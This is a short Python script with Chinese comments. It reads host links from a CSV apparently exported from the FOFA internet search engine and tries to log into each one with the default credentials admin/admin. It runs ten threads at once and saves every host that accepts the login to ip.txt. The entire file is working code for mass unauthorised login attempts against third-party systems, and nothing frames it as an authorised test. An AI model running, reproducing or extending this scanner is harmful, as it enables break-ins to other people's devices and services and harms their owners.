import pandas as pd
import requests
from concurrent.futures import ThreadPoolExecutor
import logging

# Set up logging
logging.basicConfig(filename='host_check.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# 读取CSV文件中的link列
df = pd.read_csv('fofa.csv')  # 假设你的CSV文件名是fofa.csv
link_list = df['link'].tolist()  # 假设链接列名是'link'

def check_host(link):
    try:
        response = requests.get(link, timeout=1)
        if response.status_code == 200:
            # 发送登录请求
            login_payload = {'username': 'admin', 'password': 'admin'}
            login_response = requests.post(f'{link}/login', data=login_payload, timeout=1)
            if 'true' in login_response.text:
                logging.info(f'Successful login: {link}')
                print(f'{link}')
                with open('ip.txt', 'a') as f:
                    f.write(f'{link}\n')
        else:
            logging.info(f'Failed to connect: {link} (status code: {response.status_code})')
    except requests.RequestException as e:
        logging.error(f'Error connecting to {link}: {e}')

# 使用ThreadPoolExecutor进行多线程处理
with ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(check_host, link_list)
